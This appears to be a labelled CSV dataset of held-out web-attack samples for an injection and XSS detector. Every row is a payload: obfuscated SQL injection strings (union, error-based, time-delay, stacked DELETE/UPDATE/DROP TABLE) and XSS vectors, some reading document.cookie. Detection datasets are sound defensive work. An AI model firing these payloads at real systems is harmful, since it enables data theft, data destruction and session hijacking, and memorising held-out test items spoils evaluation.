text,label,attack_type,category,generator
"`+uNioN%09all+sElECT/**/name,0x78 FRom%0ausers/**_**/#",1,sqli,union,held_out
"')+ANd	updatexml(1,concat(0x7e,(select%09token%20from	tokens	limit+1)),1)-- ",1,sqli,error,held_out
"%27 Or	hash=CHAR(115,101,108,101,99,116)-- ",1,sqli,hex_obf,held_out
<iframe	onpointerover=window%5B%27ale%27%2B%27rt%27%5D%601%60>,1,xss,reflected,held_out
1	oR%090x61=0x61+#,1,sqli,boolean_blind,held_out
')/**/OR/*!*/6betweEN/**/0 ANd+9	#,1,sqli,boolean_blind,held_out
');%0auPdATE%20users/**/seT name=1 -- 	,1,sqli,stacked,held_out
`;/**/uPDATE%20clients+SEt/**/id=1%20-- 	,1,sqli,stacked,held_out
"""%0aUNIon+ALL/*!*/SElECT+CHAR(120),NULL,0x78,CHAR(120)/**/FroM+accounts+-- 	",1,sqli,union,held_out
<video/onmouseover=top['al'+'ert'](1)>,1,xss,reflected,held_out
';/**_**/insErt+InTO/**/products%0avaLuEs(1)/**_**/-- 	,1,sqli,stacked,held_out
1;/*!*/DEletE from+clients%09%2d%2d ,1,sqli,stacked,held_out
<formonbegin=eval(atob('YWxlcnQoMSk='))><!--stored-->,1,xss,stored,held_out
<svg%20onstart=window['ale'+'rt']`1`><!--comment-->,1,xss,stored,held_out
%27;%20WAITfOR	DelAY%09'0:0:9'/**_**/%2d%2d ,1,sqli,time_blind,held_out
"""/**_**/UNIoN%0aaLL%20SeLecT/*!*/0x78,0x78,name,0x78,balance FROM%09products%09-- 	",1,sqli,union,held_out
'%20OR%20'a'lIKE'a'	%2d%2d ,1,sqli,boolean_blind,held_out
"""><input onanimationstart=(alert)(1)>",1,xss,attribute,held_out
"%27+UniOn+All/**_**/sElECT+role,NULL,balance,0x78%0aFROm sessions/**/-- -",1,sqli,union,held_out
#<img onerror=eval(atob('YWxlcnQoMSk='))>,1,xss,dom,held_out
"""%20UNIoN+ALl	selECT+0x78,NULL,0x78,CHAR(120)/*!*/frOm%0aproducts%09#",1,sqli,union,held_out
`;+INSeRT	inTo	products%20vaLues(1)+%2d%2d ,1,sqli,stacked,held_out
<detailsonerror=(alert)(1)>,1,xss,reflected,held_out
"""/**/aNd (SELECT/**/1%0afrOM%20(SELECT(sLEEp(6)))x)-- -",1,sqli,time_blind,held_out
"""onfocus=eval(atob('YWxlcnQoMSk='))x=""",1,xss,attribute,held_out
1;%0aWaiTFOR/**/dELaY/*!*/'0:0:7'+-- -,1,sqli,time_blind,held_out
"1/**_**/aND%0aupdatexml(1,concat(0x7e,(select/**/balance/**_**/from%09admins limit	1)),1)-- 	",1,sqli,error,held_out
"'/**_**/UNiON+AlL/*!*/SelEct%09email,hash,CHAR(120)/**_**/FrOm%20products+%2d%2d ",1,sqli,union,held_out
`+Or/*!*/email=0x726f6f74-- 	,1,sqli,hex_obf,held_out
"""; updAtE/**/members%0aSet/*!*/name=1%0a-- ",1,sqli,stacked,held_out
"'/*!*/UnION/*!*/ALL	SelEcT%0a0x78,NULL,0x78,NULL,role%0aFRoM%20admins+-- ",1,sqli,union,held_out
"""/onbegin=alert(String.fromCharCode(88,83,83))/x=""",1,xss,attribute,held_out
"')%20AnD+(select/**/count(*)+from/**/admins/*!*/group+by%0aconcat((select%09id/**_**/from%0amembers/**_**/limit%091),floor(rand(0)*2)))#",1,sqli,error,held_out
"""%20onfocus=top['al'+'ert'](1)%20x=""",1,xss,attribute,held_out
"1/**_**/ANd/**_**/(select%09count(*) from%0astaff%09group/**_**/by/*!*/concat((select/**_**/hash+from/**/members/**_**/limit%201),floor(rand(0)*2)))%2d%2d ",1,sqli,error,held_out
""";/**/inSert%09iNTO tokens/**/VALuEs(1)/**/-- 	",1,sqli,stacked,held_out
<math%20onstart=print%2528%2529>,1,xss,reflected,held_out
"""/**_**/Or%0atoken=CHAR(115,101,108,101,99,116)/*z*/",1,sqli,hex_obf,held_out
"""><object ontoggle=alert(1)>",1,xss,attribute,held_out
"%27/**/uNiON/**/alL/**/SeleCt/*!*/0x78,password,pwd%0aFRom+staff/**_**/-- 	",1,sqli,union,held_out
"1 aND+updatexml(1,concat(0x7e,(select%0abalance%09from/**/admins/**/limit+1)),1)%2d%2d ",1,sqli,error,held_out
"data:text/html,<details onload=eval(atob('YWxlcnQoMSk='))>",1,xss,dom,held_out
<svg%09onmouseover=eval%2528atob%2528%2527YWxlcnQoMSk%253D%2527%2529%2529>,1,xss,reflected,held_out
"""/onanimationstart=alert(String.fromCharCode(88,83,83))/x=""",1,xss,attribute,held_out
"""%20And/*!*/(select/**_**/count(*)/*!*/from members/**_**/group/**/by	concat((select/*!*/email%0afrom/**_**/admins	limit/*!*/1),floor(rand(0)*2)))/*z*/",1,sqli,error,held_out
<svg/onstart=top['al'+'ert'](1)>,1,xss,reflected,held_out
""";%0aINSerT	InTO%20accounts/*!*/VAluEs(1)	#",1,sqli,stacked,held_out
"%27/**_**/OR password=CHAR(117,110,105,111,110)#",1,sqli,hex_obf,held_out
"""%09and/**_**/(select%09count(*)%0afrom%09accounts%20group/*!*/by%20concat((select/*!*/balance	from%20products	limit 1),floor(rand(0)*2)))%2d%2d ",1,sqli,error,held_out
"'%20UnIoN+ALl%09SeLeCT/**/0x78,0x78,NULL,CHAR(120),NULL/**/from	members/**_**/-- ",1,sqli,union,held_out
"%27%0aUNION%20ALL/**_**/SElEcT%09name,CHAR(120)	FRoM users/**/-- 	",1,sqli,union,held_out
%27;%0aDEleTE FRom/*!*/members/*!*/-- ,1,sqli,stacked,held_out
"""><object onstart=print()>",1,xss,attribute,held_out
<sCrIpT>alert(document.cookie)</sCrIpT>,1,xss,reflected,held_out
')%20or/**_**/token=0x726f6f74-- ,1,sqli,hex_obf,held_out
'onfocus=(alert)(1)',1,xss,attribute,held_out
')+Or/**_**/0x61=0x61 -- ,1,sqli,boolean_blind,held_out
1;+delEte+fRom	sessions+-- 	,1,sqli,stacked,held_out
"""%20and/**_**/updatexml(1,concat(0x7e,(select%09pwd/**_**/from users+limit/*!*/1)),1)-- 	",1,sqli,error,held_out
"data:text/html,<math ontoggle=(alert)(1)>",1,xss,dom,held_out
"data:text/html,<svg onmouseover=(alert)(1)>",1,xss,dom,held_out
#<details onpointerover=window['ale'+'rt']`1`>,1,xss,dom,held_out
<audioonerror=alert(document.cookie)>,1,xss,reflected,held_out
`;/**_**/insERt%09iNTo%0aorders/**/vALUES(1)%09%2d%2d ,1,sqli,stacked,held_out
')%0aor/**_**/sLEeP(8)/**/%2d%2d ,1,sqli,time_blind,held_out
"'%09anD/*!*/(select%20count(*)%09from%20tokens%20group/**/by/*!*/concat((select%20role/*!*/from/**_**/products/*!*/limit/*!*/1),floor(rand(0)*2)))-- ",1,sqli,error,held_out
');/**/inserT/**_**/INTo/**/staff/**_**/vaLUEs(1)	%2d%2d ,1,sqli,stacked,held_out
`/**/Or/**_**/balance=0x726f6f74#,1,sqli,hex_obf,held_out
"' unioN+All/**/SeLEcT/*!*/NULL,NULL,CHAR(120)%09fROM%20tokens%20-- -",1,sqli,union,held_out
') Or%0aid=0x756e696f6e/*z*/,1,sqli,hex_obf,held_out
"%27+and%0a(select/**_**/count(*)	from+orders+group by/**_**/concat((select%20hash%0afrom products/**_**/limit/**/1),floor(rand(0)*2)))/*z*/",1,sqli,error,held_out
"""	or/**/sleeP(6)%0a/*z*/",1,sqli,time_blind,held_out
');/*!*/uPdaTE clients/**/Set%20token=1/**/-- -,1,sqli,stacked,held_out
"""><video onstart=window['ale'+'rt']`1`>",1,xss,attribute,held_out
1;	DeLeTE%09fROM/**_**/users/*!*/-- -,1,sqli,stacked,held_out
<body%09onerror=top['al'+'ert'](1)><!--stored-->,1,xss,stored,held_out
<svg/onfocus=alert(document.cookie)>,1,xss,reflected,held_out
')%20oR%09SLeep(4)%20-- -,1,sqli,time_blind,held_out
#<math onpointerover=top['al'+'ert'](1)>,1,xss,dom,held_out
%27/*!*/Or/**/'b'likE'a'/*!*/%2d%2d ,1,sqli,boolean_blind,held_out
""" OR%09token=0x726f6f74#",1,sqli,hex_obf,held_out
'-alert(document.cookie)-',1,xss,attribute,held_out
"`%09UnION%20ALl SELECT%0aCHAR(120),balance,0x78,password FrOm/**/members%20/*z*/",1,sqli,union,held_out
<form	onfocus=top['al'+'ert'](1)><!--post-->,1,xss,stored,held_out
<iframe onpointerover=alert(document.cookie)>,1,xss,reflected,held_out
<svg/onstart=print()>,1,xss,reflected,held_out
"%27+oR balance=CHAR(117,110,105,111,110)%2d%2d ",1,sqli,hex_obf,held_out
1;%20UPdAte+tokens%09SEt+id=1/*!*/-- -,1,sqli,stacked,held_out
""" onmouseover=alert(1) x=""",1,xss,attribute,held_out
1;/*!*/DELete/**_**/froM/**/staff+-- ,1,sqli,stacked,held_out
#<audio onmouseover=window['ale'+'rt']`1`>,1,xss,dom,held_out
'); WAiTFOR%0adElaY%0a'0:0:5'%20-- ,1,sqli,time_blind,held_out
"'%0aanD	updatexml(1,concat(0x7e,(select/**_**/token+from/*!*/orders/**/limit+1)),1)/*z*/",1,sqli,error,held_out
<imgonbegin=alert%281%29>,1,xss,reflected,held_out
""" onload=alert(String.fromCharCode(88,83,83)) x=""",1,xss,attribute,held_out
"""><body onmouseover=(alert)(1)>",1,xss,attribute,held_out
%27/*!*/or/**/0x61=0x61+-- ,1,sqli,boolean_blind,held_out
%27+oR%20slEEP(7)/**_**/-- -,1,sqli,time_blind,held_out
'-alert(1)-',1,xss,attribute,held_out
"'-alert(String.fromCharCode(88,83,83))-'",1,xss,attribute,held_out
<math	onfocus=print()><!--post-->,1,xss,stored,held_out
'	onpointerover=window['ale'+'rt']`1`	',1,xss,attribute,held_out
"'%09uNion%0aAlL%20SeleCT/**/CHAR(120),0x78,NULL,name,CHAR(120)/**_**/FrOM/**/members+#",1,sqli,union,held_out
"1	ANd extractvalue(1,concat(0x7e,(select+password/**/from%20tokens limit/**_**/1)))#",1,sqli,error,held_out
"""%0aUnion/*!*/ALl+SElEcT/**/NULL,0x78,id,0x78 fRom clients+#",1,sqli,union,held_out
`	oR%20'a'liKe'a' -- -,1,sqli,boolean_blind,held_out
#<video onpointerover=print()>,1,xss,dom,held_out
"%27 unIOn/**/ALl+SELect/**_**/NULL,NULL,NULL+FROm%20staff%20-- -",1,sqli,union,held_out
` OR/**/0x61=0x61/**/%2d%2d ,1,sqli,boolean_blind,held_out
%27 or/*!*/'b'lIke'b'/**_**/-- ,1,sqli,boolean_blind,held_out
<svg/onpointerover=window['ale'+'rt']`1`>,1,xss,reflected,held_out
`;/**/waiTFoR dELaY+'0:0:3'/**_**/-- ,1,sqli,time_blind,held_out
"`/**/aNd/*!*/updatexml(1,concat(0x7e,(select%09pwd+from/**/admins%20limit/*!*/1)),1)%2d%2d ",1,sqli,error,held_out
1;	waITfoR/**/dELay/**/'0:0:6'/*!*/-- -,1,sqli,time_blind,held_out
`;%20UpdaTe%0astaff%0aSET id=1/**_**//*z*/,1,sqli,stacked,held_out
<form onbegin=(alert)(1)>,1,xss,reflected,held_out
"1%09AnD/*!*/(select count(*)/**/from/*!*/users	group%20by%0aconcat((select%0apwd/**/from staff/*!*/limit/**/1),floor(rand(0)*2)))#",1,sqli,error,held_out
"""; wAitfor/**/DELay+'0:0:7'/**_**/-- 	",1,sqli,time_blind,held_out
"`+AND	extractvalue(1,concat(0x7e,(select role/*!*/from	users/**/limit%091)))#",1,sqli,error,held_out
');%0adELEte%0afrOm%0aclients/*!*//*z*/,1,sqli,stacked,held_out
"data:text/html,<input onanimationstart=top['al'+'ert'](1)>",1,xss,dom,held_out
"')%09oR/**/role=CHAR(115,101,108,101,99,116)-- -",1,sqli,hex_obf,held_out
"') unIon/**/aLl/*!*/sElEct%0ahash,email/**_**/frOm%20staff+#",1,sqli,union,held_out
<form onpointerover=alert(document.cookie)>,1,xss,reflected,held_out
'%20oR/*!*/'b'LIkE'b'/**_**/-- 	,1,sqli,boolean_blind,held_out
%27/**/Or 2=4	-- -,1,sqli,boolean_blind,held_out
"'%20AnD/*!*/extractvalue(1,concat(0x7e,(select/**_**/balance from%09products	limit/*!*/1)))-- 	",1,sqli,error,held_out
')%09or%20token=0x61646d696e-- -,1,sqli,hex_obf,held_out
""" onstart=top['al'+'ert'](1) x=""",1,xss,attribute,held_out
#<form onanimationstart=window['ale'+'rt']`1`>,1,xss,dom,held_out
%27%20Or%090x61=0x61 %2d%2d ,1,sqli,boolean_blind,held_out
"%27/**/UNiOn/*!*/ALL/*!*/SEleCT/*!*/NULL,CHAR(120)	FrOm admins%20/*z*/",1,sqli,union,held_out
"1%0aOr%20ssn=CHAR(115,101,108,101,99,116)/*z*/",1,sqli,hex_obf,held_out
1; dROp/*!*/table/**_**/tokens/*!*/-- ,1,sqli,stacked,held_out
"')	unIoN+ALl%09sELect/**_**/CHAR(120),NULL,CHAR(120)%09from/**/members/*!*//*z*/",1,sqli,union,held_out
';%20INsErt/**_**/INTO	sessions	VAlUes(1)	/*z*/,1,sqli,stacked,held_out
"""	or%09sleEp(9) -- 	",1,sqli,time_blind,held_out
'%0aOr%20ssn=0x73656c656374-- 	,1,sqli,hex_obf,held_out
"""+UNion+all+SElEcT/**_**/ssn,NULL frOM/**_**/orders -- -",1,sqli,union,held_out
'%09onstart=eval(atob('YWxlcnQoMSk='))%09',1,xss,attribute,held_out
%27/**/Or	8beTWeEN/**/0%0aAND 9%09-- ,1,sqli,boolean_blind,held_out
"data:text/html,<object onanimationstart=top['al'+'ert'](1)>",1,xss,dom,held_out
<sCrIpT>top['al'+'ert'](1)</sCrIpT>,1,xss,reflected,held_out
""";%20uPDaTE+orders%0aset	hash=1	/*z*/",1,sqli,stacked,held_out
"data:text/html,<details ontoggle=window['ale'+'rt']`1`>",1,xss,dom,held_out
"'+or+ssn=CHAR(114,111,111,116)-- -",1,sqli,hex_obf,held_out
<details	onstart=print()>,1,xss,reflected,held_out
"""+oR/*!*/0x61=0x61	/*z*/",1,sqli,boolean_blind,held_out
"""><audio onerror=(alert)(1)>",1,xss,attribute,held_out
"<form
onpointerover=alert(document.cookie)><!--stored-->",1,xss,stored,held_out
"`/**/aNd/**/extractvalue(1,concat(0x7e,(select%0apassword%20from%20clients%0alimit+1)))#",1,sqli,error,held_out
<iframe%20onload=print()>,1,xss,reflected,held_out
' onstart=alert(document.cookie) ',1,xss,attribute,held_out
javascript:window['ale'+'rt']`1`,1,xss,dom,held_out
<form onload=alert(document.cookie)><!--stored-->,1,xss,stored,held_out
"data:text/html,<marquee onload=alert(1)>",1,xss,dom,held_out
'%09or hash=0x73656c656374%2d%2d ,1,sqli,hex_obf,held_out
<svg/onpointerover=eval(atob('YWxlcnQoMSk='))>,1,xss,reflected,held_out
"""onload=alert(document.cookie)x=""",1,xss,attribute,held_out
%27/*!*/AnD/**_**/(SELECT%0a1/**_**/frOM%0a(SELECT(sLEep(6)))x)-- -,1,sqli,time_blind,held_out
%27; InsErt+INtO+staff+VaLuEs(1)+-- -,1,sqli,stacked,held_out
"""%0auNiON/**/ALL%20seLecT 0x78,hash,CHAR(120),email,password FrOm+staff -- ",1,sqli,union,held_out
'	And/*!*/(SELECT/**_**/1%20From (SELECT(SLEeP(7)))x)%2d%2d ,1,sqli,time_blind,held_out
%27;%20WaItfOR delaY/*!*/'0:0:6'%0a-- 	,1,sqli,time_blind,held_out
"` AnD/**/extractvalue(1,concat(0x7e,(select role from/**/orders%09limit%201)))-- ",1,sqli,error,held_out
1 aND	(SELECT+1/**/fRoM (SELECT(SLEEP(7)))x)%2d%2d ,1,sqli,time_blind,held_out
"%27/**/anD	updatexml(1,concat(0x7e,(select+pwd+from tokens%20limit+1)),1)#",1,sqli,error,held_out
"""%0aor	'a'lIKe'a'%0a/*z*/",1,sqli,boolean_blind,held_out
"' ANd/**_**/updatexml(1,concat(0x7e,(select/**_**/role%0afrom/*!*/orders	limit/**/1)),1)-- ",1,sqli,error,held_out
"""+unIon aLl	SelEcT+ssn,0x78+from/*!*/sessions%09#",1,sqli,union,held_out
' onbegin=top['al'+'ert'](1) ',1,xss,attribute,held_out
"')%09Union/**_**/AlL SeLEcT	CHAR(120),0x78,token,id,CHAR(120)+fRoM/**_**/tokens/**/#",1,sqli,union,held_out
1; waITfOr/*!*/DELAY%0a'0:0:4'%20-- 	,1,sqli,time_blind,held_out
');/**/WaItfor%20DELAy/*!*/'0:0:5'/*!*/-- ,1,sqli,time_blind,held_out
"<form
onload=top['al'+'ert'](1)><!--stored-->",1,xss,stored,held_out
<img%20onload=print()>,1,xss,reflected,held_out
'/**/ANd (SELECT%0a1 FrOm%09(SELECT(SLEEP(4)))x)%2d%2d ,1,sqli,time_blind,held_out
"1/**_**/uniOn%0aalL%09Select	NULL,NULL,NULL FROM sessions/**_**/-- -",1,sqli,union,held_out
`;%09waITfoR%20dELAY/**/'0:0:9'%20-- ,1,sqli,time_blind,held_out
1;	dELEte/**_**/froM+members%09-- 	,1,sqli,stacked,held_out
"<details%20onpointerover=alert(String.fromCharCode(88,83,83))>",1,xss,reflected,held_out
`;/**_**/dELetE%0afROm%09orders%09/*z*/,1,sqli,stacked,held_out
');%20UpDaTe/**_**/sessions/**/sET%0abalance=1/**/-- 	,1,sqli,stacked,held_out
<input%09onbegin=top['al'+'ert'](1)><!--stored-->,1,xss,stored,held_out
`%0aoR 0x61=0x61%20-- 	,1,sqli,boolean_blind,held_out
<bodyonstart=alert(1)>,1,xss,reflected,held_out
"""/**_**/or/*!*/password=CHAR(114,111,111,116)-- -",1,sqli,hex_obf,held_out
"%27%09unioN+aLL selEct 0x78,NULL,ssn from%09sessions/**/-- 	",1,sqli,union,held_out
"data:text/html,<svg onerror=top['al'+'ert'](1)>",1,xss,dom,held_out
')%20OR	SlEEp(9) #,1,sqli,time_blind,held_out
"')	oR/**/password=CHAR(97,100,109,105,110)/*z*/",1,sqli,hex_obf,held_out
"<sCrIpT>alert(String.fromCharCode(88,83,83))</sCrIpT>",1,xss,reflected,held_out
`;	WaitFOr+deLAy '0:0:9'/*!*/-- -,1,sqli,time_blind,held_out
"')+unIon%0aaLl%20seLeCt/*!*/password,name%09frOM+staff%09/*z*/",1,sqli,union,held_out
"""%20or/**/4=5	%2d%2d ",1,sqli,boolean_blind,held_out
"1%09UNiON/**_**/aLl%09SELeCt%20NULL,0x78,0x78,0x78/**_**/fRoM%20members	-- -",1,sqli,union,held_out
"""/**/unIon%0aAll/**_**/sELECt%0aCHAR(120),NULL,NULL%20From staff+-- -",1,sqli,union,held_out
`;/**_**/dElEtE%0afROM/**/sessions/**/-- -,1,sqli,stacked,held_out
1/**/or/**/'a'LIKE'a'+/*z*/,1,sqli,boolean_blind,held_out
"')/*!*/aND%0aupdatexml(1,concat(0x7e,(select	hash%09from/*!*/admins+limit%201)),1)%2d%2d ",1,sqli,error,held_out
"""/*!*/unION%20All/**_**/selECT+NULL,CHAR(120)/**/FRoM	staff/*!*//*z*/",1,sqli,union,held_out
<body/onpointerover=eval(atob('YWxlcnQoMSk='))><!--comment-->,1,xss,stored,held_out
"""><form onbegin=window['ale'+'rt']`1`>",1,xss,attribute,held_out
<body	onfocus=print()><!--comment-->,1,xss,stored,held_out
"%27 UNiON%0aaLL%09Select%09CHAR(120),NULL%20FRom%20sessions -- -",1,sqli,union,held_out
1/**_**/ANd%09(SELECT	1/**/FrOm+(SELECT(slEEP(4)))x)/*z*/,1,sqli,time_blind,held_out
"%27 uNiON	AlL%0aSeLEct CHAR(120),NULL,NULL,NULL fROm%20admins #",1,sqli,union,held_out
"1	AnD/*!*/extractvalue(1,concat(0x7e,(select/**_**/role%09from	members+limit%201)))-- 	",1,sqli,error,held_out
`; DrOp+taBLe%0ausers+-- 	,1,sqli,stacked,held_out
"')	union/*!*/aLl/**/SELEct%09ssn,CHAR(120),0x78,0x78	FrOM%09tokens+-- 	",1,sqli,union,held_out
"""/**_**/And%0aupdatexml(1,concat(0x7e,(select/*!*/email%20from%0asessions/**/limit	1)),1)#",1,sqli,error,held_out
%27+oR%0aSLEep(4)/*!*/#,1,sqli,time_blind,held_out
"%27	OR%0arole=CHAR(117,110,105,111,110)-- 	",1,sqli,hex_obf,held_out
%27;	DROP/*!*/TAbLE/*!*/clients/*!*/#,1,sqli,stacked,held_out
<video onanimationstart=eval(atob('YWxlcnQoMSk='))><!--post-->,1,xss,stored,held_out
javascript:print(),1,xss,dom,held_out
<img%20onpointerover=eval(atob('YWxlcnQoMSk='))><!--comment-->,1,xss,stored,held_out
"'/**_**/OR%09token=CHAR(114,111,111,116)-- ",1,sqli,hex_obf,held_out
"""%09Or%20role=0x73656c656374-- ",1,sqli,hex_obf,held_out
javascript:alert(1),1,xss,dom,held_out
"`/*!*/unioN%0aALl%09sEleCT/**/0x78,NULL,0x78/**/FrOm%20orders%20-- 	",1,sqli,union,held_out
<body/onbegin=eval(atob('YWxlcnQoMSk='))><!--post-->,1,xss,stored,held_out
<videoonbegin=eval(atob('YWxlcnQoMSk='))><!--comment-->,1,xss,stored,held_out
""";	DEleTe/**/fROM staff+-- 	",1,sqli,stacked,held_out
1;%20dElEte/*!*/frOM%20users%0a-- ,1,sqli,stacked,held_out
"""; UPDATE members%20SEt/**/token=1%0a/*z*/",1,sqli,stacked,held_out
<svg/onbegin=print()><!--post-->,1,xss,stored,held_out
""";%0aWaiTFor/**_**/deLAY%0a'0:0:6'/**_**/-- -",1,sqli,time_blind,held_out
<svg/onmouseover=window['ale'+'rt']`1`>,1,xss,reflected,held_out
%27;/*!*/dELeTE+from/**_**/staff/**/-- ,1,sqli,stacked,held_out
"""/**_**/or	sLeEP(3)	-- -",1,sqli,time_blind,held_out
%27	or/*!*/token=0x726f6f74-- -,1,sqli,hex_obf,held_out
"""	aNd updatexml(1,concat(0x7e,(select/**_**/balance/**/from	tokens/**/limit/*!*/1)),1)-- ",1,sqli,error,held_out
`;%20uPDAtE sessions%0aSet/**/hash=1/**/-- 	,1,sqli,stacked,held_out
"%27	unION%20aLL/*!*/SeLECT/*!*/CHAR(120),0x78,0x78+FRoM	members%0a-- 	",1,sqli,union,held_out
"#"";eval(atob('YWxlcnQoMSk='));//",1,xss,dom,held_out
"`%20anD updatexml(1,concat(0x7e,(select/*!*/id from/**_**/members/**/limit%201)),1)%2d%2d ",1,sqli,error,held_out
`%0aOR/*!*/token=0x70617373776f7264/*z*/,1,sqli,hex_obf,held_out
%27%20and%09(SELECT/**/1%09froM/**/(SELECT(SlEeP(3)))x)#,1,sqli,time_blind,held_out
"""><video onload=eval(atob('YWxlcnQoMSk='))>",1,xss,attribute,held_out
""" AnD+extractvalue(1,concat(0x7e,(select/*!*/role/**/from%09tokens+limit+1)))-- 	",1,sqli,error,held_out
<math	ontoggle=window['ale'+'rt']`1`><!--post-->,1,xss,stored,held_out
"data:text/html,<svg onfocus=alert(document.cookie)>",1,xss,dom,held_out
#<input onanimationstart=print()>,1,xss,dom,held_out
<iframe onpointerover=print()><!--post-->,1,xss,stored,held_out
1+oR%090x61=0x61/*!*/-- -,1,sqli,boolean_blind,held_out
"<inputonpointerover=alert(String.fromCharCode(88,83,83))><!--comment-->",1,xss,stored,held_out
1/**_**/OR 8BETwEeN	0+ANd%099/**/#,1,sqli,boolean_blind,held_out
"""><marquee onload=alert(String.fromCharCode(88,83,83))>",1,xss,attribute,held_out
"%27%20anD/*!*/extractvalue(1,concat(0x7e,(select/**/ssn%20from	members/*!*/limit+1)))%2d%2d ",1,sqli,error,held_out
<svg/onload=alert(document.cookie)>,1,xss,reflected,held_out
"<math	onfocus=alert(String.fromCharCode(88,83,83))>",1,xss,reflected,held_out
"""%20oR%20email=CHAR(112,97,115,115,119,111,114,100)#",1,sqli,hex_obf,held_out
"<svg onstart=alert(String.fromCharCode(88,83,83))><!--comment-->",1,xss,stored,held_out
<svgonstart=eval(atob('YWxlcnQoMSk='))><!--post-->,1,xss,stored,held_out
"""/onload=eval(atob('YWxlcnQoMSk='))/x=""",1,xss,attribute,held_out
"""%20And/**/extractvalue(1,concat(0x7e,(select	ssn	from%20admins/**/limit%0a1)))#",1,sqli,error,held_out
"""/onstart=eval(atob('YWxlcnQoMSk='))/x=""",1,xss,attribute,held_out
"""; uPDate/*!*/products%0aSEt id=1%0a-- 	",1,sqli,stacked,held_out
1/*!*/or/*!*/9=1%09-- -,1,sqli,boolean_blind,held_out
';/**/UPDaTE	sessions	Set pwd=1%20/*z*/,1,sqli,stacked,held_out
';/*!*/dELEte/**/FROm/*!*/sessions%09-- ,1,sqli,stacked,held_out
"1%20ANd/**/extractvalue(1,concat(0x7e,(select	token+from%0aproducts/**/limit%201)))/*z*/",1,sqli,error,held_out
1%0aand/*!*/%28SELECT/**/1/**_**/frOm+(SELECT(SLeEP(5)))x)-- -,1,sqli,time_blind,held_out
<iframe%09onpointerover=alert(document.cookie)>,1,xss,reflected,held_out
%27%20aND (SELECT/*!*/1/*!*/fROm%09(SELECT(sLEEP(7)))x)#,1,sqli,time_blind,held_out
""";%09INSErT/**_**/INto%20orders/*!*/valUES(1)%20%2d%2d ",1,sqli,stacked,held_out
"#"";window['ale'+'rt']`1`;//",1,xss,dom,held_out
"')/*!*/uNion aLL/*!*/SeLECt/*!*/password,CHAR(120)%0afrOm/**/accounts%20-- -",1,sqli,union,held_out
');%20dELEte FROM staff%09%2d%2d ,1,sqli,stacked,held_out
<svg%20onbegin=alert(1)><!--post-->,1,xss,stored,held_out
"""><video ontoggle=alert(1)>",1,xss,attribute,held_out
<svg/onload=eval(atob('YWxlcnQoMSk='))>,1,xss,reflected,held_out
`;%09DElEtE%0afrom%0aclients/*!*/-- 	,1,sqli,stacked,held_out
%27;/**_**/WaITFoR%0aDElAy%09'0:0:4'+#,1,sqli,time_blind,held_out
<marquee/onpointerover=alert(1)>,1,xss,reflected,held_out
"`%09oR/**/email=CHAR(115,101,108,101,99,116)-- ",1,sqli,hex_obf,held_out
%27;%20wAITfOR%09DeLAy%20'0:0:5'%09-- ,1,sqli,time_blind,held_out
'%20or%20'b'LiKe'a'/**_**/-- 	,1,sqli,boolean_blind,held_out
"data:text/html,<video onmouseover=alert(String.fromCharCode(88,83,83))>",1,xss,dom,held_out
"""/*!*/UNIoN/**_**/aLl/**_**/sElECT%09CHAR(120),CHAR(120),0x78,email+fRom%0astaff/**/#",1,sqli,union,held_out
"""%09And	extractvalue(1,concat(0x7e,(select%0ahash/*!*/from orders%0alimit/**_**/1)))-- 	",1,sqli,error,held_out
"'
ontoggle=window['ale'+'rt']`1`
'",1,xss,attribute,held_out
%27+OR%0arole=0x726f6f74%2d%2d ,1,sqli,hex_obf,held_out
"data:text/html,<input onbegin=(alert)(1)>",1,xss,dom,held_out
"')	OR+password=CHAR(117,110,105,111,110)/*z*/",1,sqli,hex_obf,held_out
%27%20oR%0a6=8%20-- 	,1,sqli,boolean_blind,held_out
"<video	onanimationstart=alert(String.fromCharCode(88,83,83))><!--stored-->",1,xss,stored,held_out
"data:text/html,<body onfocus=window['ale'+'rt']`1`>",1,xss,dom,held_out
1;%20delEtE/**_**/frOm orders/**//*z*/,1,sqli,stacked,held_out
"""; inSERT/*!*/intO	sessions/**_**/valuES(1)/**/-- 	",1,sqli,stacked,held_out
"""/*!*/UniOn	alL selEct/**_**/CHAR(120),NULL,NULL%09fRoM%09members/**_**/-- 	",1,sqli,union,held_out
"%27	UniON	aLl seLEct%09CHAR(120),pwd%20FrOM%09tokens	%2d%2d ",1,sqli,union,held_out
#<math ontoggle=alert(document.cookie)>,1,xss,dom,held_out
"`+aND+updatexml(1,concat(0x7e,(select%20role	from%09tokens/**/limit/**_**/1)),1)-- 	",1,sqli,error,held_out
1 or	token=0x756e696f6e-- 	,1,sqli,hex_obf,held_out
"""><input onanimationstart=alert(1)>",1,xss,attribute,held_out
